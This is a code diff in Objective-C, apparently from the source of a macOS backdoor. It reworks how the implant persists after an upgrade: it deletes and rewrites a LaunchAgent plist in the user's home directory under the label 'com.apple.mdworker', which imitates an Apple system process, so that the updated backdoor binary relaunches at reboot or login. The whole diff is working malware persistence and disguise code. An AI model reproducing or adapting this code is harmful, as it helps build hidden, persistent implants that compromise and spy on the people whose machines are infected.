@@ -59,39 +59,35 @@
   
   //
   // Once the backdoor has been written, edit the backdoor Loader in order to
-  // load the new updated backdoor upon reboot
+  // load the new updated backdoor upon reboot/login
   //
   NSString *backdoorLaunchAgent = [[NSString alloc] initWithFormat: @"%@/%@",
                                    NSHomeDirectory(),
-                                   BACKDOOR_DAEMON_PLIST ];
+                                   BACKDOOR_DAEMON_PLIST];
   
-  NSString *_backdoorPath = [[[NSBundle mainBundle] executablePath]
-                             stringByReplacingOccurrencesOfString: gBackdoorName
-                                                       withString: gBackdoorUpdateName];
+  NSError *error = nil;
+  if ([[NSFileManager defaultManager] removeItemAtPath: backdoorLaunchAgent
+                                                 error: &error] == NO)
+    {
+#ifdef DEBUG_UP_NOP
+      errorLog(@"Error while removing LaunchAgent file, reason: %@", [error localizedDescription]);
+#endif
+    }
   
-  [[NSFileManager defaultManager] removeItemAtPath: backdoorLaunchAgent
-                                             error: nil];
-  
-  NSMutableDictionary *rootObj = [NSMutableDictionary dictionaryWithCapacity: 1];
-  NSDictionary *innerDict;
-  
-  innerDict = [[NSDictionary alloc] initWithObjectsAndKeys:
-               @"com.apple.mdworker", @"Label",
-               [NSNumber numberWithBool: FALSE], @"OnDemand",
-               [NSArray arrayWithObjects: _backdoorPath, nil],
-               @"ProgramArguments", nil];
-  //[NSNumber numberWithBool: TRUE], @"RunAtLoad", nil];
-  
-  [rootObj addEntriesFromDictionary: innerDict];
-  success = [rootObj writeToFile: backdoorLaunchAgent
-                      atomically: NO];
+  success = [gUtil createLaunchAgentPlist: @"com.apple.mdworker"
+                                forBinary: gBackdoorUpdateName];
   
   if (success == NO)
     {
-#ifdef DEBUG_UPGRADE_NOP
+#ifdef DEBUG_UP_NOP
       errorLog(@"Error while writing backdoor launchAgent plist");
 #endif
-      return success;
+    }
+  else
+    {
+#ifdef DEBUG_UP_NOP
+      infoLog(@"LaunchAgent file updated");
+#endif
     }
   
   return YES;
